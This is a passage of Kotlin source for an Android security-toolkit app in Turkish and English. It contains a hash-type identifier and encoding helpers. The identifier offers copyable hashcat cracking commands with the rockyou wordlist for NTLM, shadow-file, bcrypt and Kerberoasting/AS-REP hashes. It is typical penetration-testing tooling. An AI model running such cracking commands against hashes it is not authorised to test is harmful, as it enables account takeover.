                value = hashInput,
                onValueChange = { hashInput = it },
                label = { Text(if (language == AppLanguage.TR) "Hash Değerini Yapıştırın" else "Paste Hash Here") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberGreen,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                )
            )

            if (trimmed.isNotEmpty()) {
                Spacer(modifier = Modifier.height(12.dp))
                // Quick Statistics Cards
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Box(
                        modifier = Modifier
                            .weight(1f)
                            .clip(RoundedCornerShape(8.dp))
                            .background(SurfaceDark)
                            .border(1.dp, BorderDark, RoundedCornerShape(8.dp))
                            .padding(8.dp),
                        contentAlignment = Alignment.Center
                    ) {
                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
                            Text("UZUNLUK", fontSize = 9.sp, fontFamily = FontFamily.Monospace, color = TextMuted)
                            Text("${trimmed.length} char (${trimmed.length * 4} bit)", fontSize = 11.5.sp, fontWeight = FontWeight.Bold, color = TerminalCyan)
                        }
                    }

                    Box(
                        modifier = Modifier
                            .weight(1f)
                            .clip(RoundedCornerShape(8.dp))
                            .background(SurfaceDark)
                            .border(1.dp, BorderDark, RoundedCornerShape(8.dp))
                            .padding(8.dp),
                        contentAlignment = Alignment.Center
                    ) {
                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
                            Text("ENTROPİ", fontSize = 9.sp, fontFamily = FontFamily.Monospace, color = TextMuted)
                            Text("$entropy bits/char", fontSize = 11.5.sp, fontWeight = FontWeight.Bold, color = CyberGreen)
                        }
                    }
                }
            }

            Spacer(modifier = Modifier.height(16.dp))

            Text(
                text = if (language == AppLanguage.TR) "OLASI HASH TÜRLERİ & KIRMA BAYRAKLARI" else "POSSIBLE HASH TYPES & CRACKING FLAGS",
                style = MaterialTheme.typography.labelLarge,
                color = CyberGreen
            )
            Spacer(modifier = Modifier.height(8.dp))

            candidates.forEach { cand ->
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(vertical = 5.dp)
                        .clip(RoundedCornerShape(10.dp))
                        .background(SurfaceDark)
                        .border(1.dp, BorderDark, RoundedCornerShape(10.dp))
                        .padding(12.dp)
                ) {
                    Column {
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(text = cand.name, color = CyberGreen, fontWeight = FontWeight.Bold, fontSize = 13.sp)
                            if (cand.hashcatMode.isNotBlank()) {
                                Box(
                                    modifier = Modifier
                                        .clip(RoundedCornerShape(4.dp))
                                        .background(TerminalCyan.copy(alpha = 0.2f))
                                        .padding(horizontal = 6.dp, vertical = 2.dp)
                                ) {
                                    Text(text = "Hashcat: ${cand.hashcatMode}", color = TerminalCyan, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
                                }
                            }
                        }

                        if (cand.description.isNotBlank()) {
                            Spacer(modifier = Modifier.height(4.dp))
                            Text(text = cand.description, color = TextSecondary, fontSize = 11.sp)
                        }

                        if (cand.crackCommand.isNotBlank()) {
                            Spacer(modifier = Modifier.height(8.dp))
                            Box(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .clip(RoundedCornerShape(6.dp))
                                    .background(CodeBlockBg)
                                    .border(1.dp, BorderDark, RoundedCornerShape(6.dp))
                                    .clickable {
                                        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                                        clipboard.setPrimaryClip(ClipData.newPlainText("Crack Command", cand.crackCommand))
                                        Toast.makeText(context, if (language == AppLanguage.TR) "Kırma komutu kopyalandı!" else "Cracking command copied!", Toast.LENGTH_SHORT).show()
                                    }
                                    .padding(8.dp)
                            ) {
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = Arrangement.SpaceBetween,
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    Text(
                                        text = cand.crackCommand,
                                        color = TextPrimary,
                                        fontFamily = FontFamily.Monospace,
                                        fontSize = 10.5.sp,
                                        modifier = Modifier.weight(1f)
                                    )
                                    Spacer(modifier = Modifier.width(6.dp))
                                    Icon(
                                        imageVector = Icons.Default.ContentCopy,
                                        contentDescription = "Copy",
                                        tint = CyberGreen,
                                        modifier = Modifier.size(14.dp)
                                    )
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

// -------------------------------------------------------------
// HELPER MODELS & LOGIC
// -------------------------------------------------------------

data class HashCandidate(
    val name: String,
    val description: String = "",
    val hashcatMode: String = "",
    val crackCommand: String = ""
)

fun calculateEntropy(s: String): Double {
    if (s.isEmpty()) return 0.0
    val map = mutableMapOf<Char, Int>()
    s.forEach { map[it] = (map[it] ?: 0) + 1 }
    var entropy = 0.0
    val len = s.length.toDouble()
    for ((_, count) in map) {
        val p = count / len
        entropy -= p * (Math.log(p) / Math.log(2.0))
    }
    return (entropy * 100).toInt() / 100.0
}

fun convertIpv4(ip: String): Map<String, String> {
    val parts = ip.trim().split(".")
    if (parts.size != 4) return emptyMap()
    val octets = parts.mapNotNull { it.toIntOrNull() }
    if (octets.size != 4 || octets.any { it !in 0..255 }) return emptyMap()
    val dec = (octets[0].toLong() shl 24) or (octets[1].toLong() shl 16) or (octets[2].toLong() shl 8) or octets[3].toLong()
    val hex = "0x" + octets.joinToString("") { String.format("%02X", it) }
    val octal = octets.joinToString(".") { String.format("%04o", it) }
    val binary = octets.joinToString(".") { Integer.toBinaryString(it).padStart(8, '0') }
    return mapOf(
        "Decimal (DWORD)" to dec.toString(),
        "Hexadecimal" to hex,
        "Octal" to octal,
        "Binary" to binary
    )
}

fun rot13(input: String): String {
    return input.map { c ->
        when (c) {
            in 'a'..'z' -> ((c - 'a' + 13) % 26 + 'a'.code).toChar()
            in 'A'..'Z' -> ((c - 'A' + 13) % 26 + 'A'.code).toChar()
            else -> c
        }
    }.joinToString("")
}

fun stringToHex(s: String, spaceSeparated: Boolean): String {
    return s.toByteArray(Charsets.UTF_8).joinToString(if (spaceSeparated) " " else "") {
        String.format("%02x", it)
    }
}

fun hexToString(hex: String): String {
    val clean = hex.replace(" ", "").replace("0x", "").replace(":", "")
    if (clean.length % 2 != 0) return "Geçersiz Hex (tek sayıda karakter)"
    return try {
        val bytes = ByteArray(clean.length / 2)
        for (i in bytes.indices) {
            bytes[i] = clean.substring(i * 2, i * 2 + 2).toInt(16).toByte()
        }
        String(bytes, Charsets.UTF_8)
    } catch (e: Exception) {
        "Geçersiz Hex baytları"
    }
}

fun htmlEntityEncode(s: String): String {
    return s.map { c ->
        when (c) {
            '<' -> "&lt;"
            '>' -> "&gt;"
            '&' -> "&amp;"
            '"' -> "&quot;"
            '\'' -> "&#39;"
            '/' -> "&#x2F;"
            else -> c.toString()
        }
    }.joinToString("")
}

fun htmlEntityDecode(s: String): String {
    return s.replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&amp;", "&")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
        .replace("&#x2F;", "/")
}

fun identifyHashDetailed(hash: String): List<HashCandidate> {
    if (hash.isEmpty()) return listOf(HashCandidate("Girdi bekleniyor...", "Lütfen tanımlamak istediğiniz hash değerini yapıştırın."))
    val len = hash.length
    val isHex = hash.matches(Regex("^[0-9a-fA-F]+$"))
    val list = mutableListOf<HashCandidate>()

    if (isHex) {
        when (len) {
            32 -> {
                list.add(HashCandidate("MD5", "Eski ve yaygın 128-bit hash", "-m 0", "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt"))
                list.add(HashCandidate("NTLM", "Windows yerel parola hash formatı", "-m 1000", "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt"))
                list.add(HashCandidate("MD4", "Eski Windows & NTLM temeli", "-m 900", "hashcat -m 900 hashes.txt /usr/share/wordlists/rockyou.txt"))
            }
            40 -> {
                list.add(HashCandidate("SHA-1", "160-bit kriptografik özet", "-m 100", "hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt"))
                list.add(HashCandidate("MySQL 4.1/5+", "MySQL veritabanı parola hash'i", "-m 300", "hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt"))
            }
            56 -> {
                list.add(HashCandidate("SHA-224", "224-bit SHA-2 ailesi", "-m 1300", "hashcat -m 1300 hashes.txt /usr/share/wordlists/rockyou.txt"))
            }
            64 -> {
                list.add(HashCandidate("SHA-256", "Modern standart 256-bit hash", "-m 1400", "hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt"))
                list.add(HashCandidate("Keccak-256", "Ethereum / Web3 hash formatı", "-m 17700", "hashcat -m 17700 hashes.txt /usr/share/wordlists/rockyou.txt"))
            }
            96 -> {
                list.add(HashCandidate("SHA-384", "384-bit SHA-2 ailesi", "-m 10800", "hashcat -m 10800 hashes.txt /usr/share/wordlists/rockyou.txt"))
            }
            128 -> {
                list.add(HashCandidate("SHA-512", "512-bit güçlü kriptografik özet", "-m 1700", "hashcat -m 1700 hashes.txt /usr/share/wordlists/rockyou.txt"))
                list.add(HashCandidate("Whirlpool", "512-bit blok şifre tabanlı hash", "-m 6100", "hashcat -m 6100 hashes.txt /usr/share/wordlists/rockyou.txt"))
            }
        }
    }

    if (hash.startsWith("$2a$") || hash.startsWith("$2b$") || hash.startsWith("$2y$")) {
        list.add(HashCandidate("bcrypt", "Blowfish tabanlı yavaş hash algoritması", "-m 3200", "hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt"))
    }
    if (hash.startsWith("$6$")) {
        list.add(HashCandidate("SHA512-Crypt", "Linux /etc/shadow varsayılan parola formatı", "-m 1800", "hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt"))
    }
    if (hash.startsWith("$1$")) {
        list.add(HashCandidate("MD5-Crypt", "Eski Linux /etc/shadow parola formatı", "-m 500", "hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt"))
    }
    if (hash.startsWith("\$krb5asrep\$")) {
        list.add(HashCandidate("Kerberos 5 AS-REP", "AS-REP Roasting saldırı çıktısı", "-m 18200", "hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt"))
    }
    if (hash.startsWith("\$krb5tgs\$")) {
        list.add(HashCandidate("Kerberos 5 TGS", "Kerberoasting SPN servis bileti hash'i", "-m 13100", "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt"))
    }

    if (list.isEmpty()) {
        list.add(HashCandidate("Bilinmeyen İmza", "Uzunluk: $len karakter. Özel tuzlama (salt) veya tescilli algoritma olabilir."))
    }
    return list
}
